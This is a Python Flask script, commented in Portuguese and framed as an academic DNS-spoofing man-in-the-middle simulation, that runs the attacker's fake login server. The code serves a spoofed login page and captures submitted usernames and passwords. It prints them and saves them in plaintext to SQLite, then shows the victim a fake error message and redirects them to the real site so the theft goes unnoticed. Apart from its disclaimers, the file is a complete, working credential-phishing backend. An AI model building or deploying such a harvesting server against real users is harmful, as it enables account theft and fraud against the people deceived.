#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
============================================================
 Simulação acadêmica de ataque MITM (DNS Spoofing)
 Uso exclusivo para fins educacionais em ambiente controlado.
============================================================

 SERVIDOR FLASK — VERSÃO FAKE
 =============================
 Este servidor roda na instância do atacante. Diferenças:

 1. POST /login retorna JSON (em vez de redirecionar)
    permitindo que o JS exiba erro e redirecione.
 2. Armazena credenciais no SQLite local (dados.db).
 3. Não há página home — após captura, redireciona
    a vítima para o site legítimo via JavaScript.

 FLUXO:
 ======
 [DNS Spoofing → vítima acessa este servidor]
   → Serve index.html (login fake com cores avermelhadas)
   → Vítima preenche e-mail e senha
   → JS envia dados via fetch() para POST /login
   → Servidor captura e armazena no SQLite
   → Retorna JSON com URL do site legítimo
   → JS exibe "Erro temporário..." e redireciona

 CONFIGURAÇÃO:
 =============
 Altere LEGITIMATE_SITE_URL para o IP do site legítimo.

 ATENÇÃO: Uso SOMENTE para fins acadêmicos.
============================================================
"""

# ============================================================
# Importações
# ============================================================
from flask import Flask, request, jsonify, send_from_directory
import sqlite3
import os
from datetime import datetime

# ============================================================
# Configuração
# ============================================================

# URL do site LEGÍTIMO — para onde a vítima será redirecionada
# IMPORTANTE: Altere para o IP correto no seu laboratório.
# Exemplos:
#   'http://192.168.1.100'
#   'http://10.0.0.5'
#   'http://securebank.local'
LEGITIMATE_SITE_URL = 'http://192.168.1.100'

app = Flask(__name__, static_folder='static')

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
DATABASE = os.path.join(BASE_DIR, 'dados.db')


# ============================================================
# Inicialização do Banco de Dados
# ============================================================
def inicializar_banco():
    """
    Cria o banco de dados e a tabela 'logins' caso não existam.
    Mesma estrutura do servidor legítimo para permitir comparação.
    """
    conn = sqlite3.connect(DATABASE)
    cursor = conn.cursor()

    cursor.execute('''
        CREATE TABLE IF NOT EXISTS logins (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            usuario TEXT NOT NULL,
            senha TEXT NOT NULL,
            data_hora TEXT NOT NULL
        )
    ''')

    conn.commit()
    conn.close()
    print(f"[*] Banco de dados inicializado: {DATABASE}")


# ============================================================
# Rotas do Servidor
# ============================================================

@app.route('/')
def pagina_inicial():
    """
    Rota principal — serve a página de login FAKE.
    A vítima é direcionada aqui via DNS Spoofing.
    """
    return send_from_directory('static', 'index.html')


@app.route('/login', methods=['GET', 'POST'])
def capturar_login():
    """
    Endpoint de captura de credenciais — VERSÃO FAKE.

    DIFERENÇA DO LEGÍTIMO: retorna JSON em vez de redirecionar,
    permitindo que o JavaScript:
    1. Exiba mensagem de "erro temporário"
    2. Redirecione a vítima para o site real após delay
    """
    if request.method == 'GET':
        return send_from_directory('static', 'index.html')

    usuario = request.form.get('usuario', '').strip()
    senha = request.form.get('senha', '').strip()

    if not usuario or not senha:
        print("[!] Tentativa de login com campos vazios — ignorando.")
        return jsonify({
            'status': 'error',
            'message': 'Campos vazios',
            'redirect_url': LEGITIMATE_SITE_URL
        }), 400

    data_hora = datetime.now().strftime('%d/%m/%Y %H:%M:%S')

    # -------------------------------------------------------
    # Exibe dados capturados no terminal
    # -------------------------------------------------------
    print("=" * 50)
    print("  🔴 [CAPTURA DE CREDENCIAIS — SERVIDOR FAKE]")
    print("=" * 50)
    print(f"  Usuário:   {usuario}")
    print(f"  Senha:     {senha}")
    print(f"  Data/Hora: {data_hora}")
    print("=" * 50)

    # -------------------------------------------------------
    # Salva no banco SQLite
    # -------------------------------------------------------
    try:
        conn = sqlite3.connect(DATABASE)
        cursor = conn.cursor()
        cursor.execute(
            'INSERT INTO logins (usuario, senha, data_hora) VALUES (?, ?, ?)',
            (usuario, senha, data_hora)
        )
        conn.commit()
        conn.close()
        print(f"[+] Dados salvos no banco de dados com sucesso!")
    except Exception as e:
        print(f"[!] Erro ao salvar no banco de dados: {e}")

    # -------------------------------------------------------
    # Retorna JSON para o JavaScript do frontend
    # -------------------------------------------------------
    return jsonify({
        'status': 'captured',
        'message': 'Credenciais capturadas com sucesso',
        'redirect_url': LEGITIMATE_SITE_URL
    })


# ============================================================
# Rota genérica para servir arquivos estáticos
# ============================================================
@app.route('/<path:filename>')
def servir_arquivo_estatico(filename):
    """Serve CSS, JS e outros recursos da pasta 'static'."""
    return send_from_directory('static', filename)


# ============================================================
# Ponto de entrada
# ============================================================
if __name__ == '__main__':
    inicializar_banco()

    print()
    print("=" * 55)
    print("  🔴 SERVIDOR FAKE DE SIMULAÇÃO MITM ATIVO")
    print("=" * 55)
    print(f"  Host:  127.0.0.1 (somente local — Apache faz proxy)")
    print(f"  Porta: 8081")
    print(f"  Banco de dados:   {DATABASE}")
    print(f"  Redireciona para: {LEGITIMATE_SITE_URL}")
    print("  Aguardando conexões...")
    print("=" * 55)
    print()

    # Porta 8081 — diferente do servidor legítimo (8080)
    app.run(host='127.0.0.1', port=8081, debug=False)
